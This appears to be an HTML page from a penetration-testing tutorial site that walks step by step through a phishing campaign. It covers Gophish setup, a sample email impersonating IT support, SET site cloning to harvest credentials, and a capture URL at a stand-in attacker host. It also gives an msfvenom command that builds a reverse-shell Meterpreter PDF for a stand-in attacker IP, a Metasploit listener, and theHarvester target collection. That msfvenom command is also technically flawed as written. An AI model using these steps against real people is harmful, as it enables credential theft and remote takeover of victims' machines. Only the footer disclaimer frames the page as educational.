@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Engineering</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body>
+    <!-- Dropdown Menu HTML to be added to each page -->
+    <div class="dropdown-menu-container">
+        <button class="dropdown-toggle" onclick="toggleDropdownMenu()">Menu</button>
+        <div class="dropdown-menu" id="dropdownMenu">
+            <a href="index.html">Home</a>
+            <a href="linux_basics.html">Linux Basics</a>
+            <a href="osint.html">OSINT</a>
+            <a href="social_engineering.html">Social Engineering</a>
+            <a href="nmap.html">Enumeration</a>
+            <a href="exploitation.html">Exploitation</a>
+            <a href="Webapp_Testing.html">Web Application Testing</a>
+            <a href="privilege_escalation.html">Privilege Escalation</a>
+            <a href="persistence.html">Persistence</a>
+            <a href="password_cracking.html">Password Cracking</a>
+            <a href="wpa2_cracking.html">WPA2 Cracking</a>
+            <a href="additional_training.html">Additional Training</a>
+        </div>
+    </div>
+
+    <header>
+        <h1>Social Engineering</h1>
+    </header>
+
+    <div class="content">
+        <h2>Introduction to Social Engineering</h2>
+        <p>Social engineering is a technique that manipulates human behavior and emotions to gain access to sensitive information or prompt actions that compromise security, bypassing traditional technical defenses. Instead of exploiting system vulnerabilities, social engineering targets the natural tendencies of individuals, such as trust, curiosity, or fear, to deceive them into revealing confidential data or performing actions that benefit the attacker. This can take many forms, including <strong>phishing</strong>, where fraudulent emails are used to trick recipients into divulging passwords or clicking malicious links; <strong>website spoofing</strong>, where attackers create fake versions of trusted websites to steal login credentials; and <strong>impersonation</strong>, where attackers pose as legitimate entities or authority figures to gain trust and extract information. These tactics exploit the human element of security, which is often the weakest link, making social engineering one of the most effective and dangerous attack vectors in cybersecurity.</p>
+      
+        <h2>Online Social Engineering Techniques</h2>
+
+        <h3>Phishing</h3>
+        <p>Phishing is an essential social engineering technique used to manipulate individuals into performing actions, such as clicking a malicious link or providing sensitive information. To perform a phishing campaign, you need to craft emails that appear legitimate, often imitating trusted entities like banks, online services, or government agencies. The goal is to deceive the target into clicking on a link or downloading an attachment, which leads to credential harvesting or malware installation.</p>
+        <p>Phishing campaigns can range from simple, generic messages to more targeted attacks, such as spear phishing, which personalizes the content based on information gathered about the victim. This makes the message more believable and increases the likelihood of success.</p>
+
+        <h3>Phishing Tools and Setup</h3>
+        <p>To perform a phishing campaign, a range of tools are available to design, execute, and track the success of the campaign. One of the most commonly used tools is <strong>Gophish</strong>, an open-source phishing framework that allows you to create, manage, and track phishing emails. Below are detailed steps and commands for setting up and executing a phishing campaign using Gophish and other tools.</p>
+        <div class="video-container">
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/knc6Iq-hNcw?si=wz83x5m6fShitCsg" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+        <div>
+            <p>Video Credit: <strong>DemmSec</strong> - GoPhish</p>
+        </div>
+        <h4>Setting Up Gophish</h4>
+        <p>To begin setting up a phishing campaign using Gophish, follow these steps:</p>
+        <p>Download Gophish:</p> 
+        <div class="terminal">
+            <pre>wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</pre>
+        </div>
+        <p>Unzip the file:</p> 
+        <div class="terminal">
+            <pre>unzip gophish-v0.11.0-linux-64bit.zip</pre>
+        </div>
+        <p>Navigate to the extracted folder:</p> 
+        <div class="terminal">
+            <pre>cd gophish</pre>
+        </div>
+        <p>Run Gophish:</p> 
+        <div class="terminal">
+            <pre>./gophish</pre>
+        </div>
+        <p>Once Gophish is running, access the Gophish dashboard by opening your browser and navigating to <code>http://localhost:3333</code>. The default credentials are username: <code>admin</code> and password: <code>gophish</code>. From the dashboard, configure email templates, create campaigns, and track the success of the phishing attack.</p>
+
+        <h4>Crafting Phishing Emails</h4>
+        <p>To craft an effective phishing email, mimic a trusted entity by modifying the "From" address, subject line, and email body. Here’s an example email format that impersonates a trusted IT department:</p>
+        <div class="terminal">
+            <pre>From: IT Support &lt;it-support@fakecompany.com&gt;
+Subject: Important Account Update - Action Required
+Body: Please click the link below to verify your account information:
+&lt;a href="http://maliciouslink.com"&gt;Verify Account&lt;/a&gt;</pre>
+        </div>
+        <p>Make sure to customize the content based on the organization or individual being targeted. For spear phishing campaigns, personalize the email by including information relevant to the target, such as their job role or recent activities, which can be gathered using OSINT tools.</p>
+
+        <h4>Email Spoofing</h4>
+        <p>Email spoofing is necessary to make the phishing email appear as if it is coming from a legitimate source. Use tools like <strong>King Phisher</strong> or manually forge email headers. To spoof the "From" field, configure email server settings or bypass security mechanisms such as <strong>SPF (Sender Policy Framework)</strong> validation.</p>
+
+        <h4>Setting Up a Fake Login Page</h4>
+        <p>After a phishing email is delivered, direct victims to a fake login page where they will enter their credentials. Use <strong>SET (Social Engineering Toolkit)</strong> to clone legitimate websites and set up phishing landing pages. Follow these steps to clone a website using SET:</p>
+
+        <p>Open the Social Engineering Toolkit (SET) in your terminal:</p>
+        <div class="terminal">
+            <pre>setoolkit</pre>
+        </div>
+
+        <p>From the SET main menu, select the following options:</p>
+        <div class="terminal">
+            <pre>
+1) Social Engineering Attacks
+2) Website Attack Vectors
+3) Credential Harvester Attack Method
+2) Site Cloner
+            </pre>
+        </div>
+
+        <p>When prompted, enter the URL of the website you wish to clone (e.g., <code>https://example.com</code>):</p>
+        <div class="terminal">
+            <pre>Enter the URL to clone: https://example.com</pre>
+        </div>
+
+        <p>SET will now create a fake login page based on the website you cloned. When a user inputs their credentials, they will be captured and logged for further use. Configure Gophish to direct users to this fake page by linking the malicious URL in the phishing email.</p>
+
+        <h4>Tracking and Collecting Credentials</h4>
+        <p>Once a victim clicks the link in the phishing email, they will be directed to the fake login page created by SET. To track user interactions and collect credentials, monitor the Gophish dashboard for engagement metrics such as clicks, submissions, and opened emails. For every credential submission, the data is logged and stored for future reference:</p>
+        <div class="terminal">
+            <pre>http://attacker-server.com/login?username=[USERNAME]&password=[PASSWORD]</pre>
+        </div>
+        <div class="video-container">
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/xYBsXkxDRh0?si=5lBLwSibJprwrj3n" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+        <div>
+            <p>Video Credit: <strong>Loi Liang Yang</strong> - Virus.PDF</p>
+        </div>
+        <h4>Delivering Phishing Payloads</h4>
+        <p>Phishing attacks often go beyond simple credential harvesting. In more advanced cases, the goal may be to deliver a malicious payload directly to the target’s machine. This can be done by embedding the payload in an email attachment, such as a PDF, or by providing a link to download a malicious file. The embedded payload, when executed, allows remote access to the victim’s machine or execution of other malicious actions.</p>
+        <p>To create a reverse shell payload and embed it into a PDF using <strong>Metasploit</strong> and <strong>msfvenom</strong>, use the following command:</p>
+
+        <div class="terminal">
+            <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f pdf &gt; malicious.pdf</pre>
+        </div>
+
+        <p>This command generates a reverse TCP Meterpreter shell for Windows and embeds it in a PDF file. Replace <code>attacker_ip</code> with your local IP address (the system that will receive the reverse shell) and <code>LPORT=4444</code> with the port that will listen for the reverse connection.</p>
+
+        <p>Once the PDF is created, it can be attached to a phishing email, encouraging the target to download and open it under the guise of an important document. Upon opening, the payload inside the PDF is executed, creating a reverse shell connection back to the attacker’s machine.</p>
+        <p>To capture the reverse shell connection, set up a listener in Metasploit with the following commands:</p>
+
+        <div class="terminal">
+            <pre>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST attacker_ip
+set LPORT 4444
+exploit</pre>
+        </div>
+
+        <p>With this listener active, it will wait for the reverse shell connection. When the victim opens the malicious PDF, the connection is established, and you gain control of the target system using Meterpreter, where you can issue commands, upload/download files, and escalate privileges.</p>
+
+        <h4>Spear Phishing with OSINT Tools</h4>
+        <p>Spear phishing is more targeted and effective because it involves gathering detailed information about the victim before launching the attack. Use OSINT tools like <strong>theHarvester</strong> or <strong>Maltego</strong> to collect relevant information on the target, such as email addresses, phone numbers, social media profiles, and job roles. This data can be used to craft a more convincing phishing email, increasing the likelihood of the target interacting with it.</p>
+        <p>To gather email addresses from public sources, you can use <strong>theHarvester</strong>, a powerful OSINT tool that helps collect information such as emails, subdomains, IPs, and more from various public sources. For example, you can use theHarvester to search for email addresses associated with a specific domain:</p>
+
+        <div class="terminal">
+            <pre>theHarvester -d targetdomain.com -b google</pre>
+        </div>
+
+        <p>In this command:</p>
+        <ul>
+            <li><code>-d targetdomain.com</code>: Specifies the target domain you are investigating. Replace <code>targetdomain.com</code> with the actual domain you want to gather email addresses from.</li>
+            <li><code>-b google</code>: Defines the source to query for the information. In this case, <code>google</code> is the search engine being used, but you can also specify other sources such as Bing, LinkedIn, or others supported by theHarvester.</li>
+        </ul>
+
+        <p>Once executed, theHarvester will search through the specified source (Google in this case) and return a list of email addresses, subdomains, and other information associated with the target domain. This data can be valuable for spear-phishing campaigns, further reconnaissance, or simply gathering contact information for a security audit.</p>
+
+        <p>You can also modify the command to search multiple sources at once or specify additional options for more advanced data collection:</p>
+
+        <div class="terminal">
+            <pre>theHarvester -d targetdomain.com -b google,bing,linkedin -l 500</pre>
+        </div>
+
+        <p>In this command:</p>
+        <ul>
+            <li><code>-b google,bing,linkedin</code>: Queries multiple sources, increasing the likelihood of finding relevant information.</li>
+            <li><code>-l 500</code>: Limits the number of results from each source to 500, ensuring a broader data collection.</li>
+        </ul>
+
+        <p>By using tools like theHarvester, you can automate the process of gathering publicly available information, which is especially useful in reconnaissance phases of cybersecurity assessments, penetration testing, or targeted attacks like spear-phishing.</p>
+
+        <p>Phishing campaigns are an effective way to gain unauthorized access to sensitive information. Tools like Gophish streamline the creation and execution of phishing emails, while SET and Metasploit can be used to clone websites and deliver malware payloads. Properly tracking engagement metrics and gathering credentials through Gophish ensures the success of the campaign. For more targeted attacks, spear phishing, supported by OSINT tools, makes the attack even more effective.</p>
+
+    </div>
+
+    <footer>
+        <p>Disclaimer: This tutorial is intended for educational purposes only. Unauthorized access to systems is illegal. Always obtain permission before attempting any penetration testing</p>
+    </footer>
+
+    <!-- JavaScript File -->
+    <script src="main.js"></script>
+</body>
+
+</html>
